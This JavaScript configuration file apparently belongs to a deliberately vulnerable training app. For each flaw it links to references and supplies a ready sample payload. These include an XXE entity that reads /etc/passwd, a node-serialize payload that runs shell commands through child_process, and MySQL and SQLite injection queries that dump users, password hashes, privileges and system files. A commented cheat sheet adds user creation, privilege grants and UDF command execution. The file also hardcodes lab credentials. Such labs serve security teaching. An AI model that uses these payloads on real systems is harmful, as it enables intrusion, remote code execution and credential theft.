let hacks = {
    xmlparser: {
        hackref: "https://portswigger.net/web-security/xxe",
        //hackref: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        devref: "https://www.npmjs.com/package/libxmljs",
        genref: "https://xmlwriter.net/xml_guide/entity_declaration.shtml",
        //genref: "https://www.w3schools.com/xml/xml_dtd_intro.asp",
        config: `noent=true&noblanks=true`,
        sample: `<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY bar SYSTEM "file:///etc/passwd" >]>
<products>
<product> <name>PS3</name> <description>&bar;</description> </product>
<product> <name>PS4</name> <description>Gaming Console</description> </product>
</products>`,
    },
    jsondeser: {
        hackref:
            "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
        devref: "https://www.npmjs.com/package/node-serialize",
        genref:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a8-insecure-deserialization.md",
        //owasp: "",
        sample: `{
"msg":"See server log for RCE :-)",
"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"
}`,
        config: ``,
    },
    ldapsearch: {
        hackref:
            "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.html",
        devref: "http://ldapjs.org/client.html#search",
        genref: "https://ldapwiki.com/wiki/LDAP%20Query%20Examples",
        sample2: `{
    "bind":{"dn":"uid=tesla,dc=example,dc=com","password":"password"},
    "search":{"base":"dc=example,dc=com", "options":{"scope":"sub"}},
    "serverinfo":"https://www.forumsys.com/tutorials/integration-how-to/ldap/online-ldap-test-server/"
}`,
        sample: `{
    "bind":{"dn":"cn=admin,dc=testorg,dc=com","password":"admin"},
    "search":{
        "base":"dc=testorg,dc=com", 
        "options":{
            "scope":"sub",
            "filter": "(&(uid=fred)(sn=mack))"
        }
    }
}`,
        config2: `url=ldap://ldap.forumsys.com:389&timeout=3000&connectTimeout=3000`,
        config: `url=ldap://127.0.0.1:389&timeout=3000&connectTimeout=3000`,
    },
    mathjs: {
        hackref:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a9-using-components-with-known-vulnerability.md",
        devref: "https://mathjs.org/docs/expressions/parsing.html",
        genref: "https://mathjs.org/docs/expressions/parsing.html",
        sample: "",
        config: "",
    },
    mysql: {
        hackref: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
        devref: "https://www.npmjs.com/package/mysql",
        genref: "https://mariadb.com/kb/en/select/",
        sample: `SELECT "USER-SYSUSER-DB" as __TEST__, user() as __V1__, system_user() as __V2__,  database() as __V3__ UNION

SELECT "HOST-VER-DATADIR", @@hostname, @@version, @@datadir UNION

SELECT "HOST-USER-PWD", host, user, password FROM mysql.user UNION

SELECT "ETC-PASSWD", LOAD_FILE('/etc/passwd'), "", "" UNION

SELECT "TABLE-NAME-TYPE", table_schema,table_name,table_type FROM information_schema.tables WHERE table_type != 'SYSTEM VIEW' and table_schema != 'mysql' and table_schema != 'performance_schema' UNION

SELECT "GRANTEE-PRIVTYPE-ISGRANTABLE", grantee, privilege_type, is_grantable FROM information_schema.user_privileges UNION

SELECT "SCHEMA-TABLE-COL", table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'performance_schema' AND table_schema != 'information_schema' AND table_schema != 'mysql' UNION

SELECT "SCHEMA-TABLE-COL", table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 'user' UNION

SELECT "MSG", "Done", "", "";

#SELECT "User, DB" as test, user(), system_user(),  database() INTO dumpfile '/tmp/somefile';
#SELECT "File Data", LOAD_FILE('/tmp/somefile'), "", "" UNION
# List Privileges SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; 
# List user privs SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; 
# List user privs SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; 
# List privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
# List DBA Accounts 	SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv
# List Databases 	SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0: SELECT distinct(db) FROM mysql.db — priv
# List Columns 	SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
# List Tables 	SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
# Find Tables From Column Name 	SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
# Select Nth Row 	SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0; SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
# Select Nth Char 	SELECT substr(‘abcd’, 3, 1); # returns c
# Bitwise AND 	SELECT 6 & 2; # returns 2
# SELECT 6 & 1; # returns 0
# ASCII Value -> Char 	SELECT char(65); # returns A
# Char -> ASCII Value 	SELECT ascii(‘A’); # returns 65
# Casting 	SELECT cast(’1′ AS unsigned integer);
# SELECT cast(’123′ AS char);
# String Concatenation 	SELECT CONCAT(‘A’,'B’); #returns AB
# SELECT CONCAT(‘A’,'B’,'C’); # returns ABC
# If Statement 	SELECT if(1=1,’foo’,'bar’); — returns ‘foo’
# Case Statement 	SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A
# Avoiding Quotes 	SELECT 0×414243; # returns ABC
# Time Delay 	SELECT BENCHMARK(1000000,MD5(‘A’));
# SELECT SLEEP(5); # >= 5.0.12
# Command Execution 	If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.
# priv, can only read world-readable files.
# SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;
# priv, write to file system
# Create Users 	CREATE USER test1 IDENTIFIED BY ‘pass1′; — priv
# Delete Users 	DROP USER test1; — priv
# Make User DBA 	GRANT ALL PRIVILEGES ON *.* TO test1@’%'; — priv
# Location of DB files 	SELECT @@datadir;
# Default/System Databases 	information_schema (>= mysql 5.0) mysql        
# SELECT "information_schema.tables" as "table", table_schema,table_name,table_type FROM information_schema.tables UNION
# SELECT "mysql.user", host,user,password from mysql.user;`,
        config: `host=localhost&user=tester&database=mysql&password=Passw0rd123`,
    },
    sqlite: {
        hackref:
            "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md",
        devref: "https://www.npmjs.com/package/sqlite3",
        genref: "https://www.sqlitetutorial.net",
        sample: `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1 UNION
select "SQLITE_VERSION", sqlite_version(),"","" UNION
select "SQLITE_DATE", datetime('now','localtime'),"","" UNION
select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table";\n
pragma module_list;\npragma database_list;\npragma function_list;`,
        config: `dbFile=/app/data/chinook.db`,
    },
};
